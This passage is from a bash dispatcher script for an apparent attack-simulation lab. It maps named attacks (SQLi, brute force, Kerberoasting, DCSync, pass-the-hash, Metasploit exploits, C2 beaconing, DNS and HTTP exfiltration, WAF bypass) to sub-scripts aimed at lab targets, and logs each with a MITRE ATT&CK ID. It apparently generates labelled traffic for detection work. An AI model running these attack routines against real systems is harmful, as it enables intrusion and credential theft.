        bash "$script_path" "$subtype" "$target_ip" "$target_port" "${RESULTS_BASE}/${attack_id}" || true
    else
        echo -e "${RED}Script not found: $script_path${NC}"
    fi

    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} AD attack complete"
    log_complete "$attack_id" "$category" "$subtype" "$technique" "$tool" "$target_ip" "$target_port" "$service" "true" "$notes"
}

###############################################################################
# MAIN — Argument Parsing
###############################################################################

init_log

# Parse flags before positional arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        --auto-confirm|--yes|-y)
            AUTO_CONFIRM=true
            shift
            ;;
        --campaign-id)
            CAMPAIGN_ID="$2"
            shift 2
            ;;
        *)
            break
            ;;
    esac
done

ATTACK_TYPE="${1:-}"
NOTES="${2:-}"

# Append campaign ID to notes if set
if [[ -n "$CAMPAIGN_ID" ]]; then
    NOTES="${NOTES:+${NOTES} | }Campaign: ${CAMPAIGN_ID}"
fi

case "$ATTACK_TYPE" in
    -h|--help|help)
        print_help
        ;;
    -l|--list|list)
        list_attacks
        ;;

    # =========================================================================
    # Web exploits (DVWA)
    # =========================================================================
    web_lfi)
        run_web_exploit "lfi" "$NOTES"
        ;;
    web_cmdi)
        run_web_exploit "cmdi" "$NOTES"
        ;;
    web_xss)
        run_web_exploit "xss" "$NOTES"
        ;;
    web_path_traversal)
        run_web_exploit "path_traversal" "$NOTES"
        ;;
    web_config_hunt)
        run_web_exploit "config" "$NOTES"
        ;;
    web_log4shell)
        run_web_exploit "log4shell" "$NOTES"
        ;;
    web_full_exploit)
        run_web_exploit "full" "$NOTES"
        ;;

    # =========================================================================
    # Juice Shop attacks
    # =========================================================================
    juice_sqli|juice_xss|juice_auth_bypass|juice_bola|juice_file_upload|juice_full)
        subtype="${ATTACK_TYPE#juice_}"
        run_script_attack "juice_shop.sh" "$subtype" "web" "T1190" "custom" "$JUICE_IP" "$JUICE_PORT" "http" "$NOTES"
        ;;
    juice_dirbusting)
        attack_id=$(gen_attack_id)
        log_start "$attack_id" "web" "directory_enum" "T1083" "gobuster" "$JUICE_IP" "$JUICE_PORT" "http" "$NOTES"
        confirm_attack
        echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack starting..."
        gobuster dir -u "http://${JUICE_IP}:${JUICE_PORT}/" -w /usr/share/wordlists/dirb/common.txt -t 20 -q 2>/dev/null || true
        echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack complete"
        log_complete "$attack_id" "web" "directory_enum" "T1083" "gobuster" "$JUICE_IP" "$JUICE_PORT" "http" "true" "$NOTES"
        ;;

    # =========================================================================
    # Credential attacks
    # =========================================================================
    cred_login)
        run_credential_attack "web_login" "$NOTES"
        ;;
    cred_wordpress)
        run_credential_attack "wordpress" "$NOTES"
        ;;
    cred_xmlrpc)
        run_credential_attack "xmlrpc" "$NOTES"
        ;;
    cred_stuffing)
        run_credential_attack "stuffing" "$NOTES"
        ;;
    cred_enum)
        run_credential_attack "enum" "$NOTES"
        ;;
    cred_slow)
        run_credential_attack "slow" "$NOTES"
        ;;
    cred_full)
        run_credential_attack "full" "$NOTES"
        ;;

    # =========================================================================
    # Recon
    # =========================================================================
    recon_syn)
        run_recon "syn" "$NOTES"
        ;;
    recon_full)
        run_recon "full" "$NOTES"
        ;;
    recon_udp)
        run_recon "udp" "$NOTES"
        ;;
    recon_version)
        run_recon "version" "$NOTES"
        ;;
    recon_os)
        run_recon "os" "$NOTES"
        ;;
    recon_aggressive)
        run_recon "aggressive" "$NOTES"
        ;;
    recon_slow)
        run_recon "slow" "$NOTES"
        ;;

    # =========================================================================
    # Brute force
    # =========================================================================
    brute_ssh)
        run_brute_force "ssh" "$NOTES"
        ;;
    brute_ftp)
        run_brute_force "ftp" "$NOTES"
        ;;
    brute_telnet)
        run_brute_force "telnet" "$NOTES"
        ;;
    brute_mysql)
        run_brute_force "mysql" "$NOTES"
        ;;
    brute_postgres)
        run_brute_force "postgres" "$NOTES"
        ;;

    # =========================================================================
    # C2 Simulation
    # =========================================================================
    c2_beacon_http)
        run_c2_beacon "http_beacon" "$NOTES"
        ;;
    c2_beacon_dns)
        run_c2_beacon "dns" "$NOTES"
        ;;
    c2_exfil_http)
        run_c2_beacon "http_exfil" "$NOTES"
        ;;
    c2_jitter)
        run_c2_beacon "jitter" "$NOTES"
        ;;

    # =========================================================================
    # SQLi (legacy — requires DVWA session)
    # =========================================================================
    web_sqli_union|web_sqli_blind|web_sqli_time)
        echo -e "${YELLOW}SQLi attacks require DVWA session. Use sqlmap manually or see scripts/web_sqli.sh${NC}"
        ;;

    # =========================================================================
    # Dirbusting
    # =========================================================================
    web_dirbusting)
        attack_id=$(gen_attack_id)
        log_start "$attack_id" "web" "directory_enum" "T1083" "gobuster" "$DVWA_IP" "80" "http" "$NOTES"
        confirm_attack
        echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack starting..."
        gobuster dir -u "http://${DVWA_IP}/" -w /usr/share/wordlists/dirb/common.txt -t 20 -q 2>/dev/null || true
        echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack complete"
        log_complete "$attack_id" "web" "directory_enum" "T1083" "gobuster" "$DVWA_IP" "80" "http" "true" "$NOTES"
        ;;

    # =========================================================================
    # SMB/NetBIOS Attacks
    # =========================================================================
    smb_enum|smb_brute|smb_relay|smb_full)
        subtype="${ATTACK_TYPE#smb_}"
        run_script_attack "smb_attacks.sh" "$subtype" "smb" "T1021.002" "enum4linux" "$METASPLOIT_IP" "445" "smb" "$NOTES"
        ;;

    # =========================================================================
    # SSH Attacks
    # =========================================================================
    ssh_enum|ssh_banner|ssh_cipher_enum|ssh_full)
        subtype="${ATTACK_TYPE#ssh_}"
        run_script_attack "ssh_attacks.sh" "$subtype" "credential" "T1110" "custom" "$METASPLOIT_IP" "22" "ssh" "$NOTES"
        ;;

    # =========================================================================
    # DNS Attacks
    # =========================================================================
    dns_zone_transfer|dns_tunnel|dns_enum|dns_full)
        subtype="${ATTACK_TYPE#dns_}"
        run_script_attack "dns_attacks.sh" "$subtype" "recon" "T1046" "custom" "$DVWA_IP" "53" "dns" "$NOTES"
        ;;

    # =========================================================================
    # Database Attacks
    # =========================================================================
    db_mysql|db_postgres|db_credential_spray|db_full)
        subtype="${ATTACK_TYPE#db_}"
        run_script_attack "db_attacks.sh" "$subtype" "exploit" "T1190" "custom" "$METASPLOIT_IP" "3306" "database" "$NOTES"
        ;;

    # =========================================================================
    # SNMP Attacks
    # =========================================================================
    snmp_enum|snmp_full)
        subtype="${ATTACK_TYPE#snmp_}"
        run_script_attack "snmp_attacks.sh" "$subtype" "recon" "T1046" "snmpwalk" "$SERVICES_SNMP_IP" "161" "snmp" "$NOTES"
        ;;

    # =========================================================================
    # Nikto Scanning
    # =========================================================================
    nikto_dvwa)
        run_script_attack "nikto_scan.sh" "dvwa" "web" "T1595" "nikto" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    nikto_juice)
        run_script_attack "nikto_scan.sh" "juice" "web" "T1595" "nikto" "$JUICE_IP" "$JUICE_PORT" "http" "$NOTES"
        ;;
    nikto_evasion)
        run_script_attack "nikto_scan.sh" "evasion" "web" "T1595" "nikto" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    nikto_full)
        run_script_attack "nikto_scan.sh" "full" "web" "T1595" "nikto" "$DVWA_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # Evasion Techniques
    # =========================================================================
    evasion_frag|evasion_decoy|evasion_slow|evasion_encoding|evasion_full)
        subtype="${ATTACK_TYPE#evasion_}"
        run_script_attack "evasion.sh" "$subtype" "evasion" "T1036" "nmap" "$TARGET_SUBNET" "*" "network" "$NOTES"
        ;;

    # =========================================================================
    # Data Exfiltration
    # =========================================================================
    exfil_http|exfil_dns|exfil_icmp|exfil_full)
        subtype="${ATTACK_TYPE#exfil_}"
        run_script_attack "exfiltration.sh" "$subtype" "exfiltration" "T1048" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # API Attacks (crAPI)
    # =========================================================================
    api_bola|api_bfla|api_mass_assign|api_jwt|api_graphql|api_full)
        subtype="${ATTACK_TYPE#api_}"
        run_script_attack "api_attacks.sh" "$subtype" "web" "T1190" "custom" "$CRAPI_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # WordPress Attacks
    # =========================================================================
    wp_enum|wp_brute|wp_xmlrpc|wp_plugin|wp_full)
        subtype="${ATTACK_TYPE#wp_}"
        run_script_attack "wordpress_attacks.sh" "$subtype" "web" "T1190" "wpscan" "$WORDPRESS_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # Windows Attacks (Original)
    # =========================================================================
    win_rdp_brute)
        run_script_attack "windows_attacks.sh" "rdp_brute" "credential" "T1110" "hydra" "$WINDOWS_IP" "3389" "rdp" "$NOTES"
        ;;
    win_iis_scan)
        run_script_attack "windows_attacks.sh" "iis_scan" "web" "T1595" "nikto" "$WINDOWS_IP" "80" "http" "$NOTES"
        ;;
    win_winrm)
        run_script_attack "windows_attacks.sh" "winrm" "exploit" "T1021.006" "evil-winrm" "$WINDOWS_IP" "5985" "winrm" "$NOTES"
        ;;
    win_smb_ms17)
        run_script_attack "windows_attacks.sh" "smb_ms17" "exploit" "T1210" "nmap" "$WINDOWS_IP" "445" "smb" "$NOTES"
        ;;
    win_full)
        run_script_attack "windows_attacks.sh" "full" "exploit" "T1210" "custom" "$WINDOWS_IP" "445" "multi" "$NOTES"
        ;;

    # =========================================================================
    # Windows Attacks (Expanded MS3 Services)
    # =========================================================================
    win_ftp_brute)
        run_script_attack "windows_attacks.sh" "ftp_brute" "credential" "T1110.001" "hydra" "$WINDOWS_IP" "21" "ftp" "$NOTES"
        ;;
    win_ssh_brute)
        run_script_attack "windows_attacks.sh" "ssh_brute" "credential" "T1110.001" "hydra" "$WINDOWS_IP" "22" "ssh" "$NOTES"
        ;;
    win_mysql_attack)
        run_script_attack "windows_attacks.sh" "mysql_attack" "exploit" "T1190" "nmap" "$WINDOWS_IP" "3306" "mysql" "$NOTES"
        ;;
    win_glassfish)
        run_script_attack "windows_attacks.sh" "glassfish" "exploit" "T1190" "curl" "$WINDOWS_IP" "4848" "glassfish" "$NOTES"
        ;;
    win_struts)
        run_script_attack "windows_attacks.sh" "struts" "exploit" "T1190" "curl" "$WINDOWS_IP" "8282" "struts" "$NOTES"
        ;;
    win_jenkins)
        run_script_attack "windows_attacks.sh" "jenkins" "exploit" "T1190" "curl" "$WINDOWS_IP" "8484" "jenkins" "$NOTES"
        ;;
    win_wamp)
        run_script_attack "windows_attacks.sh" "wamp" "exploit" "T1190" "curl" "$WINDOWS_IP" "8585" "http" "$NOTES"
        ;;
    win_elasticsearch)
        run_script_attack "windows_attacks.sh" "elasticsearch" "exploit" "T1190" "curl" "$WINDOWS_IP" "9200" "elasticsearch" "$NOTES"
        ;;
    win_manageengine)
        run_script_attack "windows_attacks.sh" "manageengine" "exploit" "T1190" "curl" "$WINDOWS_IP" "8020" "manageengine" "$NOTES"
        ;;

    # =========================================================================
    # WAF/Honeypot Attacks
    # =========================================================================
    waf_sqli_bypass)
        run_script_attack "waf_attacks.sh" "sqli_bypass" "evasion" "T1190" "curl" "$HONEYPOT_IP" "$HONEYPOT_HTTP_PORT" "http" "$NOTES"
        ;;
    waf_xss_bypass)
        run_script_attack "waf_attacks.sh" "xss_bypass" "evasion" "T1189" "curl" "$HONEYPOT_IP" "$HONEYPOT_HTTP_PORT" "http" "$NOTES"
        ;;
    waf_path_bypass)
        run_script_attack "waf_attacks.sh" "path_bypass" "evasion" "T1083" "curl" "$HONEYPOT_IP" "$HONEYPOT_HTTP_PORT" "http" "$NOTES"
        ;;
    waf_rce_bypass)
        run_script_attack "waf_attacks.sh" "rce_bypass" "evasion" "T1059" "curl" "$HONEYPOT_IP" "$HONEYPOT_HTTP_PORT" "http" "$NOTES"
        ;;
    waf_protocol_abuse)
        run_script_attack "waf_attacks.sh" "protocol_abuse" "evasion" "T1190" "curl" "$HONEYPOT_IP" "$HONEYPOT_HTTP_PORT" "http" "$NOTES"
        ;;
    waf_scanner_evasion)
        run_script_attack "waf_attacks.sh" "scanner_evasion" "evasion" "T1595" "nikto" "$HONEYPOT_IP" "$HONEYPOT_HTTP_PORT" "http" "$NOTES"
        ;;
    waf_rate_flood)
        run_script_attack "waf_attacks.sh" "rate_flood" "evasion" "T1498" "curl" "$HONEYPOT_IP" "$HONEYPOT_HTTP_PORT" "http" "$NOTES"
        ;;
    waf_fingerprint)
        run_script_attack "waf_attacks.sh" "fingerprint" "recon" "T1592" "curl" "$HONEYPOT_IP" "$HONEYPOT_HTTP_PORT" "http" "$NOTES"
        ;;
    waf_full)
        run_script_attack "waf_attacks.sh" "full" "evasion" "T1190" "mixed" "$HONEYPOT_IP" "$HONEYPOT_HTTP_PORT" "http" "$NOTES"
        ;;

    # =========================================================================
    # Active Directory Attacks (VLAN 30 — RESTRICTED)
    # =========================================================================
    ad_ldap_enum)
        run_ad_attack "ldap_enum" "recon" "T1087.002" "ldapsearch" "$AD_DC_IP" "389" "ldap" "$NOTES"
        ;;
    ad_kerb_enum)
        run_ad_attack "kerb_enum" "recon" "T1558" "kerbrute" "$AD_DC_IP" "88" "kerberos" "$NOTES"
        ;;
    ad_kerberoast)
        run_ad_attack "kerberoast" "credential" "T1558.003" "impacket" "$AD_DC_IP" "88" "kerberos" "$NOTES"
        ;;
    ad_asrep_roast)
        run_ad_attack "asrep_roast" "credential" "T1558.004" "impacket" "$AD_DC_IP" "88" "kerberos" "$NOTES"
        ;;
    ad_password_spray)
        run_ad_attack "password_spray" "credential" "T1110.003" "crackmapexec" "$AD_DC_IP" "445" "smb" "$NOTES"
        ;;
    ad_bloodhound)
        run_ad_attack "bloodhound" "recon" "T1087.002" "bloodhound-python" "$AD_DC_IP" "389" "ldap" "$NOTES"
        ;;
    ad_dcsync)
        run_ad_attack "dcsync" "credential" "T1003.006" "impacket" "$AD_DC_IP" "445" "smb" "$NOTES"
        ;;
    ad_lateral_pth)
        run_ad_attack "lateral_pth" "lateral" "T1550.002" "impacket" "$AD_WS_IP" "445" "smb" "$NOTES"
        ;;
    ad_zerologon)
        run_ad_attack "zerologon" "exploit" "T1210" "nmap" "$AD_DC_IP" "135" "rpc" "$NOTES"
        ;;
    ad_full)
        run_ad_attack "full" "exploit" "T1210" "mixed" "$AD_DC_IP" "445" "multi" "$NOTES"
        ;;

    # =========================================================================
    # Lateral Movement
    # =========================================================================
    lateral_scan|lateral_cred_reuse|lateral_pivot|lateral_full)
        subtype="${ATTACK_TYPE#lateral_}"
        run_script_attack "lateral_movement.sh" "$subtype" "lateral" "T1021" "custom" "$TARGET_SUBNET" "*" "multi" "$NOTES"
        ;;

    # =========================================================================
    # OWASP Top 10
    # =========================================================================
    owasp_injection|owasp_auth|owasp_ssrf|owasp_full)
        subtype="${ATTACK_TYPE#owasp_}"
        run_script_attack "owasp_top10.sh" "$subtype" "web" "T1190" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # Metasploit Modules
    # =========================================================================
    msf_vsftpd)
        run_msf_attack "vsftpd_backdoor.rc" "$METASPLOIT_IP" "21" "exploit" "vsftpd_backdoor" "T1190" "$NOTES"
        ;;
    msf_distcc)
        run_msf_attack "distcc_exec.rc" "$METASPLOIT_IP" "3632" "exploit" "distcc_exec" "T1203" "$NOTES"
        ;;
    msf_postgres)
        run_msf_attack "postgres_login.rc" "$METASPLOIT_IP" "5432" "credential" "postgres_login" "T1110" "$NOTES"
        ;;
    msf_mysql)
        run_msf_attack "mysql_login.rc" "$METASPLOIT_IP" "3306" "credential" "mysql_login" "T1110" "$NOTES"
        ;;
    msf_ms17_010)
        run_msf_attack "smb_ms17_010.rc" "$WINDOWS_IP" "445" "exploit" "ms17_010" "T1210" "$NOTES"
        ;;
    msf_tomcat)
        run_msf_attack "tomcat_mgr_upload.rc" "$METASPLOIT_IP" "8180" "exploit" "tomcat_upload" "T1190" "$NOTES"
        ;;
    msf_java_rmi)
        run_msf_attack "java_rmi.rc" "$METASPLOIT_IP" "1099" "exploit" "java_rmi" "T1190" "$NOTES"
        ;;
    msf_ssh_enum)
        run_msf_attack "ssh_enumusers.rc" "$METASPLOIT_IP" "22" "credential" "ssh_enum" "T1087" "$NOTES"
        ;;
    msf_smb_shares)
        run_msf_attack "smb_enumshares.rc" "$METASPLOIT_IP" "445" "recon" "smb_enum_shares" "T1135" "$NOTES"
        ;;
    msf_smb_users)
        run_msf_attack "smb_enumusers.rc" "$METASPLOIT_IP" "445" "recon" "smb_enum_users" "T1087" "$NOTES"
        ;;
    msf_telnet)
        run_msf_attack "telnet_login.rc" "$METASPLOIT_IP" "23" "credential" "telnet_login" "T1110" "$NOTES"
        ;;
    msf_iis_webdav)
        run_msf_attack "iis_webdav.rc" "$WINDOWS_IP" "80" "exploit" "iis_webdav" "T1190" "$NOTES"
        ;;
    msf_rdp_scan)
        run_msf_attack "rdp_scanner.rc" "$WINDOWS_IP" "3389" "recon" "rdp_scan" "T1046" "$NOTES"
        ;;
    msf_glassfish_traversal)
        run_msf_attack "glassfish_traversal.rc" "$WINDOWS_IP" "4848" "exploit" "glassfish_traversal" "T1190" "$NOTES"
        ;;
    msf_struts_rce)
        run_msf_attack "struts_rce.rc" "$WINDOWS_IP" "8282" "exploit" "struts_rce" "T1190" "$NOTES"
        ;;
    msf_jenkins_script)
        run_msf_attack "jenkins_script.rc" "$WINDOWS_IP" "8484" "exploit" "jenkins_script" "T1190" "$NOTES"
        ;;
    msf_elasticsearch_rce)
        run_msf_attack "elasticsearch_rce.rc" "$WINDOWS_IP" "9200" "exploit" "elasticsearch_rce" "T1190" "$NOTES"
        ;;
    msf_manageengine)
        run_msf_attack "manageengine_deser.rc" "$WINDOWS_IP" "8020" "exploit" "manageengine_deser" "T1190" "$NOTES"
        ;;
    msf_win_ftp)
        run_msf_attack "win_ftp_login.rc" "$WINDOWS_IP" "21" "credential" "win_ftp_login" "T1110" "$NOTES"
        ;;
    msf_ad_smb_login)
        run_msf_attack "ad_smb_login.rc" "$AD_DC_IP" "445" "credential" "ad_smb_login" "T1110" "$NOTES"
        ;;
    msf_ad_psexec)
        run_msf_attack "ad_psexec.rc" "$AD_WS_IP" "445" "exploit" "ad_psexec" "T1021.002" "$NOTES"
        ;;

    # =========================================================================
    # Noise Attacks — Scanning
    # =========================================================================
    noise_masscan)
        run_script_attack "noise_attacks.sh" "masscan_full" "recon" "T1046" "masscan" "$TARGET_SUBNET" "*" "network" "$NOTES"
        ;;
    noise_nmap_allports)
        run_script_attack "noise_attacks.sh" "nmap_allports" "recon" "T1046" "nmap" "$TARGET_SUBNET" "*" "network" "$NOTES"
        ;;
    noise_nmap_scripts)
        run_script_attack "noise_attacks.sh" "nmap_all_scripts" "recon" "T1046" "nmap" "$DVWA_IP" "*" "network" "$NOTES"
        ;;
    noise_httpx_probe)
        run_script_attack "noise_attacks.sh" "httpx_probe" "recon" "T1046" "httpx" "$TARGET_SUBNET" "*" "network" "$NOTES"
        ;;
    noise_httpx_targets)
        run_script_attack "noise_attacks.sh" "httpx_targets" "recon" "T1046" "httpx" "$TARGET_SUBNET" "*" "network" "$NOTES"
        ;;
    noise_nuclei_full)
        run_script_attack "noise_attacks.sh" "nuclei_full_scan" "recon" "T1595" "nuclei" "$DVWA_IP" "*" "network" "$NOTES"
        ;;
    noise_nuclei_cves)
        run_script_attack "noise_attacks.sh" "nuclei_cve_scan" "recon" "T1595" "nuclei" "$DVWA_IP" "*" "network" "$NOTES"
        ;;

    # =========================================================================
    # Noise Attacks — Web
    # =========================================================================
    noise_sqlmap_max)
        run_script_attack "noise_attacks.sh" "sqlmap_maximum" "web" "T1190" "sqlmap" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_xss_polyglot)
        run_script_attack "noise_attacks.sh" "xss_polyglot" "web" "T1189" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_cmdi_all)
        run_script_attack "noise_attacks.sh" "cmdi_all_os" "web" "T1059" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_lfi_deep)
        run_script_attack "noise_attacks.sh" "lfi_deep_traversal" "web" "T1083" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_dirb_huge)
        run_script_attack "noise_attacks.sh" "dirb_huge_wordlist" "web" "T1083" "dirb" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_spring4shell)
        run_script_attack "noise_attacks.sh" "spring4shell_probe" "web" "T1190" "custom" "$WINDOWS_IP" "80" "http" "$NOTES"
        ;;
    noise_shellshock)
        run_script_attack "noise_attacks.sh" "shellshock_probe" "web" "T1190" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_ffuf_dirs)
        run_script_attack "noise_attacks.sh" "ffuf_dirs" "web" "T1083" "ffuf" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_ffuf_params)
        run_script_attack "noise_attacks.sh" "ffuf_params" "web" "T1083" "ffuf" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_feroxbuster)
        run_script_attack "noise_attacks.sh" "feroxbuster_recursive" "web" "T1083" "feroxbuster" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_dalfox_scan)
        run_script_attack "noise_attacks.sh" "dalfox_scan" "web" "T1189" "dalfox" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_dalfox_pipe)
        run_script_attack "noise_attacks.sh" "dalfox_pipe" "web" "T1189" "dalfox" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_commix_scan)
        run_script_attack "noise_attacks.sh" "commix_scan" "web" "T1059" "commix" "$DVWA_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # Noise Attacks — Brute Force
    # =========================================================================
    noise_hydra_ssh_max)
        run_script_attack "noise_attacks.sh" "hydra_ssh_maximum" "credential" "T1110" "hydra" "$METASPLOIT_IP" "22" "ssh" "$NOTES"
        ;;
    noise_hydra_ftp_max)
        run_script_attack "noise_attacks.sh" "hydra_ftp_maximum" "credential" "T1110" "hydra" "$METASPLOIT_IP" "21" "ftp" "$NOTES"
        ;;
    noise_hydra_telnet_max)
        run_script_attack "noise_attacks.sh" "hydra_telnet_maximum" "credential" "T1110" "hydra" "$METASPLOIT_IP" "23" "telnet" "$NOTES"
        ;;
    noise_hydra_mysql_max)
        run_script_attack "noise_attacks.sh" "hydra_mysql_maximum" "credential" "T1110" "hydra" "$METASPLOIT_IP" "3306" "mysql" "$NOTES"
        ;;
    noise_hydra_rdp_max)
        run_script_attack "noise_attacks.sh" "hydra_rdp_maximum" "credential" "T1110" "hydra" "$WINDOWS_IP" "3389" "rdp" "$NOTES"
        ;;
    noise_medusa_parallel)
        run_script_attack "noise_attacks.sh" "medusa_parallel_brute" "credential" "T1110" "medusa" "$METASPLOIT_IP" "22" "ssh" "$NOTES"
        ;;
    noise_cme_brute)
        run_script_attack "noise_attacks.sh" "cme_smb_brute" "credential" "T1110" "crackmapexec" "$WINDOWS_IP" "445" "smb" "$NOTES"
        ;;
    noise_patator_http)
        run_script_attack "noise_attacks.sh" "patator_http_brute" "credential" "T1110" "patator" "$DVWA_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # Noise Attacks — Metasploit
    # =========================================================================
    noise_msf_shells)
        run_script_attack "noise_attacks.sh" "msf_reverse_shells" "exploit" "T1190" "metasploit" "$METASPLOIT_IP" "*" "multi" "$NOTES"
        ;;
    noise_msf_meterpreter)
        run_script_attack "noise_attacks.sh" "msf_meterpreter_sessions" "exploit" "T1190" "metasploit" "$METASPLOIT_IP" "*" "multi" "$NOTES"
        ;;

    # =========================================================================
    # Noise Attacks — C2/Exfil
    # =========================================================================
    noise_sliver_http)
        run_script_attack "noise_attacks.sh" "sliver_http_beacon" "c2" "T1071.001" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_beacon_rapid)
        run_script_attack "noise_attacks.sh" "beacon_rapid_1s" "c2" "T1071.001" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_dnscat2)
        run_script_attack "noise_attacks.sh" "dnscat2_tunnel" "c2" "T1071.004" "custom" "$AD_DC_IP" "53" "dns" "$NOTES"
        ;;
    noise_iodine)
        run_script_attack "noise_attacks.sh" "iodine_dns_tunnel" "c2" "T1071.004" "custom" "$AD_DC_IP" "53" "dns" "$NOTES"
        ;;
    noise_ptunnel)
        run_script_attack "noise_attacks.sh" "ptunnel_icmp" "exfiltration" "T1048" "custom" "$DVWA_IP" "*" "icmp" "$NOTES"
        ;;
    noise_exfil_large_http)
        run_script_attack "noise_attacks.sh" "exfil_large_http" "exfiltration" "T1048.003" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    noise_exfil_large_dns)
        run_script_attack "noise_attacks.sh" "exfil_large_dns" "exfiltration" "T1048" "custom" "$AD_DC_IP" "53" "dns" "$NOTES"
        ;;
    noise_exfil_encoded)
        run_script_attack "noise_attacks.sh" "exfil_encoded_chunks" "exfiltration" "T1048" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # Noise Attacks — Network/Impacket
    # =========================================================================
    noise_impacket_psexec)
        run_script_attack "noise_attacks.sh" "impacket_psexec" "lateral" "T1021.002" "impacket" "$WINDOWS_IP" "445" "smb" "$NOTES"
        ;;
    noise_impacket_wmiexec)
        run_script_attack "noise_attacks.sh" "impacket_wmiexec" "lateral" "T1021.003" "impacket" "$WINDOWS_IP" "135" "wmi" "$NOTES"
        ;;
    noise_impacket_smbexec)
        run_script_attack "noise_attacks.sh" "impacket_smbexec" "lateral" "T1021.002" "impacket" "$WINDOWS_IP" "445" "smb" "$NOTES"
        ;;
    noise_impacket_atexec)
        run_script_attack "noise_attacks.sh" "impacket_atexec" "lateral" "T1053" "impacket" "$WINDOWS_IP" "445" "smb" "$NOTES"
        ;;
    noise_impacket_pth)
        run_script_attack "noise_attacks.sh" "impacket_pth_all" "lateral" "T1550.002" "impacket" "$WINDOWS_IP" "445" "smb" "$NOTES"
        ;;
    noise_secretsdump)
        run_script_attack "noise_attacks.sh" "impacket_secretsdump" "credential" "T1003.006" "impacket" "$AD_DC_IP" "445" "smb" "$NOTES"
        ;;
    noise_responder_analyze)
        run_script_attack "noise_attacks.sh" "responder_analyze" "recon" "T1040" "responder" "$SOURCE_IP" "*" "network" "$NOTES"
        ;;
    noise_snmp_walk_full)
        run_script_attack "noise_attacks.sh" "snmp_walk_full_mib" "recon" "T1046" "snmpwalk" "$SERVICES_SNMP_IP" "161" "snmp" "$NOTES"
        ;;
    noise_dns_axfr_all)
        run_script_attack "noise_attacks.sh" "dns_axfr_all_targets" "recon" "T1046" "custom" "$AD_DC_IP" "53" "dns" "$NOTES"
        ;;

    # =========================================================================
    # Noise Attacks — Active Directory
    # =========================================================================
    noise_kerbrute_users)
        run_script_attack "noise_attacks.sh" "kerbrute_userenum" "credential" "T1087.002" "kerbrute" "$AD_DC_IP" "88" "kerberos" "$NOTES"
        ;;
    noise_kerbrute_passwords)
        run_script_attack "noise_attacks.sh" "kerbrute_passwordspray" "credential" "T1110.003" "kerbrute" "$AD_DC_IP" "88" "kerberos" "$NOTES"
        ;;
    noise_bloodhound_all)
        run_script_attack "noise_attacks.sh" "bloodhound_all_methods" "recon" "T1087.002" "bloodhound-python" "$AD_DC_IP" "389" "ldap" "$NOTES"
        ;;
    noise_rubeus_kerberoast)
        run_script_attack "noise_attacks.sh" "rubeus_kerberoast" "credential" "T1558.003" "impacket" "$AD_DC_IP" "88" "kerberos" "$NOTES"
        ;;
    noise_rubeus_asrep)
        run_script_attack "noise_attacks.sh" "rubeus_asreproast" "credential" "T1558.004" "impacket" "$AD_DC_IP" "88" "kerberos" "$NOTES"
        ;;
    noise_cme_spray)
        run_script_attack "noise_attacks.sh" "cme_password_spray" "credential" "T1110.003" "crackmapexec" "$AD_DC_IP" "445" "smb" "$NOTES"
        ;;
    noise_cme_pth)
        run_script_attack "noise_attacks.sh" "cme_pass_the_hash" "lateral" "T1550.002" "crackmapexec" "$AD_DC_IP" "445" "smb" "$NOTES"
        ;;
    noise_certipy_find)
        run_script_attack "noise_attacks.sh" "certipy_find" "recon" "T1087.002" "certipy" "$AD_DC_IP" "389" "ldap" "$NOTES"
        ;;
    noise_certipy_esc1)
        run_script_attack "noise_attacks.sh" "certipy_esc1" "exploit" "T1649" "certipy" "$AD_DC_IP" "389" "ldap" "$NOTES"
        ;;
    noise_certipy_shadow)
        run_script_attack "noise_attacks.sh" "certipy_shadow" "credential" "T1649" "certipy" "$AD_DC_IP" "389" "ldap" "$NOTES"
        ;;
    noise_coercer_scan)
        run_script_attack "noise_attacks.sh" "coercer_scan" "recon" "T1187" "coercer" "$AD_DC_IP" "445" "smb" "$NOTES"
        ;;
    noise_coercer_coerce)
        run_script_attack "noise_attacks.sh" "coercer_coerce" "lateral" "T1187" "coercer" "$AD_DC_IP" "445" "smb" "$NOTES"
        ;;
    noise_ldapdomaindump)
        run_script_attack "noise_attacks.sh" "ldapdomaindump_full" "recon" "T1087.002" "ldapdomaindump" "$AD_DC_IP" "389" "ldap" "$NOTES"
        ;;

    # =========================================================================
    # Gap Attacks — C2 Simulation
    # =========================================================================
    gap_cobalt_beacon)
        run_script_attack "gap_attacks.sh" "cobalt_strike_beacon" "c2" "T1071.001" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    gap_cobalt_stager)
